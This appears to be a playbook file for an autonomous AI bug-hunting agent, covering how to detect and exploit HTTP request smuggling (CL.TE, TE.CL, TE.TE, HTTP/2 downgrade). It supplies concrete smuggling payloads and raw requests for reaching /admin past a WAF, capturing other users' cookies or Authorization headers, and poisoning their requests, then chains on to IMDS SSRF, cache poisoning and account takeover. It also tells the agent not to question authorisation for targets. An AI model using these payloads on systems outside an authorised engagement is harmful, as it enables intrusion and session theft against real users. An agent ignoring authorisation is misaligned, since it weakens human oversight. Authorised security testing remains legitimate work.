# C19_http_smuggling

Test HTTP request smuggling across all variant classes: CL.TE (Content-Length governs frontend, Transfer-Encoding governs backend), TE.CL (reversed), TE.TE (both parse TE but one is confused by obfuscation), and H2.TE / H2.CL HTTP/2 downgrade smuggling. A confirmed smuggling primitive enables bypass of security controls, poisoning of other users' requests, or elevation to SSRF / internal-path access. Scope is enforced by the daemon's egress proxy; the agent does not need to second-guess authorization for accepted targets.

---

## When to use

- Surface is served through a reverse proxy, load balancer, or CDN (Nginx + backend, Haproxy + backend, Cloudflare + origin, AWS ALB + ECS).
- Traffic shows HTTP/1.1 with `Transfer-Encoding: chunked` or HTTP/2 front-end.
- Recon suggests a multi-tier architecture (frontend proxy + backend application server).
- Bug-class hints include `http-smuggling`, `request-smuggling`, `cl-te`, `te-cl`, or `h2-downgrade`.

---

## Workflow

1. **Load assignment and confirm multi-tier architecture.**
   ```
   mantis_read_hunter_brief({ target_domain, wave, agent, egress_profile, block_internal_hosts })
   ```
   Check the response stack: `Via` header, `Server` header changes across endpoints, presence of `X-Forwarded-For` added by proxy. Confirm at least a two-tier setup.

2. **CL.TE detection — timing attack.**
   Send a request where Content-Length is small (stopping before the chunk body) but Transfer-Encoding: chunked is also present. If the backend processes TE and the frontend processes CL, the backend will wait for the remainder of the chunk, causing a detectable timeout:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/", headers: { "Content-Length": "6", "Transfer-Encoding": "chunked" }, body: "3\r\nABC\r\n0\r\n\r\n", egress_profile })
   ```
   Wait up to 10 seconds. A significantly delayed response (relative to a normal request) indicates CL.TE smuggling is possible.

3. **TE.CL detection — timing attack.**
   Inverse: frontend processes TE (terminates after chunk zero), backend processes CL (waits for the remaining bytes declared in Content-Length):
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/", headers: { "Content-Length": "15", "Transfer-Encoding": "chunked" }, body: "0\r\n\r\nSMUGGLED-BODY", egress_profile })
   ```
   A timeout on this request while the normal request completes quickly indicates TE.CL.

4. **TE.TE obfuscation variants.**
   When both front and backend parse `Transfer-Encoding`, one may be confused by obfuscated values:
   - `Transfer-Encoding: xchunked`
   - `Transfer-Encoding: chunked, x`
   - `Transfer-Encoding: chunked\r\n\tencoding: chunked`
   - `Transfer-Encoding: x\r\nTransfer-Encoding: chunked` (duplicate header)
   - `X-Transfer-Encoding: chunked`
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/", headers: { "Content-Length": "6", "Transfer-Encoding": "chunked, x" }, body: "3\r\nABC\r\n0\r\n\r\n", egress_profile })
   ```

5. **CL.TE confirmation — differential request.**
   After timing attack suggests CL.TE, confirm with a differential request that poisons the next request's handler. Send a smuggled request containing the beginning of a second HTTP request:
   ```
   POST / HTTP/1.1
   Host: target.com
   Content-Length: 44
   Transfer-Encoding: chunked

   0

   GET /admin HTTP/1.1
   Host: target.com
   X-Mantis: x
   ```
   Immediately send a normal GET / request. If the response to the normal request is an unexpected `/admin` response or 403, the smuggling is confirmed.

6. **TE.CL confirmation — differential request.**
   ```
   POST / HTTP/1.1
   Host: target.com
   Content-Length: 4
   Transfer-Encoding: chunked

   7e
   GET /admin HTTP/1.1
   Host: target.com
   Content-Length: 9

   SMUGGLED
   0


   ```
   Send a normal follow-up request and check for anomalous response.

7. **HTTP/2 downgrade (H2.CL / H2.TE).**
   If the front-end speaks HTTP/2, test H2.CL: send an HTTP/2 request with a `Content-Length` header that disagrees with the actual body length. If the frontend strips HTTP/2 framing and forwards CL to the HTTP/1.1 backend, the backend may be confused:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/", headers: { "content-length": "0" }, body: "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n", egress_profile })
   ```
   Use `mantis_run_tiered` for H2-specific smuggling that requires raw HTTP/2 frame construction.

8. **Security control bypass via smuggling.**
   If smuggling is confirmed, test the following bypass targets:
   a. **Admin path bypass:** Smuggle a request to `/admin` or `/internal` that the front-end WAF would normally block.
   b. **Host header bypass:** Smuggle a request with `Host: localhost` to access internal virtual hosts.
   c. **Auth bypass:** Smuggle a request that inherits the victim's `Authorization` or `Cookie` header from the following legitimate request.
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/", headers: { "Content-Length": "X", "Transfer-Encoding": "chunked" }, body: "<smuggled GET /admin request>", egress_profile })
   ```

9. **Victim request poisoning.**
   To demonstrate user impact (without actually harming users), poison the request with a benign payload that redirects the next request to a controlled path and observe the reflected response:
   Prefix a `GET /` request with a smuggled partial request that overrides `Host` or injects a `X-Mantis-Poisoned: true` header. Send two consecutive requests and check whether the second response contains the injected header.

10. **Log coverage.**
    ```
    mantis_log_coverage({ target_domain, wave, agent, surface_id, entries: [{ endpoint: "/", method: "POST", bug_class: "http_smuggling_cl_te", auth_profile: "attacker", status: "promising"|"tested", evidence_summary: "CL.TE timing delay confirmed; follow-up request reflected /admin content" }] })
    ```

11. **Record chain attempt.**
    ```
    mantis_record_chain_attempt({ target_domain, wave, agent, surface_id, chain_id: "smuggling-to-admin-bypass", step: "admin_response_reflected", evidence: "Smuggled GET /admin reflected in response to normal POST /; front-end normally returns 403 on /admin", outcome: "finding_recorded" })
    ```

12. **Record finding.**
    Call `mantis_list_findings` first:
    ```
    mantis_record_finding({ target_domain, wave, agent, surface_id, auth_profile: "attacker", title: "HTTP request smuggling (CL.TE) — WAF bypass and admin path access", severity: "critical", cwe: "CWE-444", endpoint: "POST /", description: "...", proof_of_concept: "<smuggling request + timing evidence + differential confirmation + /admin content in follow-up response>", response_evidence: "...", impact: "Attacker bypasses WAF security controls; can access admin paths and poison other users' requests", validated: true })
    ```

13. **Write handoff.**
    ```
    mantis_write_handoff({ target_domain, wave, agent, surface_id, surface_status: "complete"|"partial", summary: "...", chain_notes: ["CL.TE smuggling confirmed; admin bypass proven; feeds GRADE directly", "H2-downgrade variant untested — needs HTTP/2 raw frame capability"] })
    ```

14. **Open verification attempt.**
    ```
    mantis_open_verification_attempt({ target_domain, wave, agent, surface_id, finding_id: "F-N", method: "timing_and_differential", notes: "Re-run timing attack and differential confirmation in fresh connection; confirm not a fluke" })
    ```

---

## Evidence requirements

Record via `mantis_record_finding`:
- Timing attack evidence: response time for the smuggling probe vs. normal request time (significant delta).
- Differential confirmation: the smuggling request and the second normal request; the second response containing content from the smuggled request's path.
- For security control bypass: the WAF-blocked response on the normal path vs. the successful response via smuggling.
- For H2 downgrade: HTTP/2 framing details and the resulting HTTP/1.1 backend confusion.
- The exact byte sequences of the smuggled request bodies, including `\r\n` notation.

---

## Stop conditions

- All CL/TE variant probes return consistent responses with no timing delta; no differential confirmation.
- Front-end normalizes all `Transfer-Encoding` headers before forwarding; TE.TE obfuscation has no effect.
- HTTP/1.1 upgrade to HTTP/2 is transparent and the backend also speaks H2; no downgrade vector.
- Two WAF blocks on malformed request bodies — log, mark WAF-blocked, stop.
- Budget at 140 turns — wrap current test, write handoff.

---

## Failure modes / false positives to avoid

- **Timing false positive.** A slow response may be due to server load, not smuggling. Run the timing probe multiple times and compare against a known-fast endpoint baseline.
- **Connection reuse interference.** HTTP request smuggling requires connection reuse. Confirm the test requests share a TCP connection (HTTP/1.1 keep-alive); starting a new connection for each request defeats the smuggling setup.
- **Differential request harming users.** In a live production environment, a differential smuggling confirmation can inject a prefix into a real user's request. Use the most benign possible smuggled prefix (a `GET /` that the application handles safely) and limit to a single confirmation attempt per variant.
- **H2 with full TLS offload.** If the CDN fully terminates H2 and re-originate H1.1 requests with proper framing, no H2 downgrade smuggling is possible at the application layer.

---

## Next chain

Feeds into **C9_ssrf_to_imds** (smuggle a request with `Host: 169.254.169.254` to reach IMDS through the backend), **C17_cache_poisoning** (use smuggling to poison the cache with a malicious response for other users), and **C12_account_takeover** (poison victim sessions by prepending attacker-controlled headers to the victim's next request).
